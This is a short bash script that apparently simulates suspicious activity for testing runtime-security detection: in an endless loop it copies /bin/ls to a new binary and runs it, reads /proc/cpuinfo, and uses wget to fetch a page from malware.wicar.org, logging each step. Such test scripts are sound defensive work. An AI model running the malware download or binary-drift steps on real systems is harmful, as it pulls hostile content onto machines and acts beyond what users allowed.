#!/bin/bash

while true
do
	cp /bin/ls ./ls_drifted
	echo "DRIFTED !" >> malicious.log
	cat /proc/cpuinfo
	./ls_drifted
	sleep 5
	wget http://malware.wicar.org/data/vlc_amv.html
	echo "MALWARE DOWNLOADED !" >> malicious.log
	cat /veryMalicious/vlc_amv.html
	sleep 90
	rm ./ls_drifted
done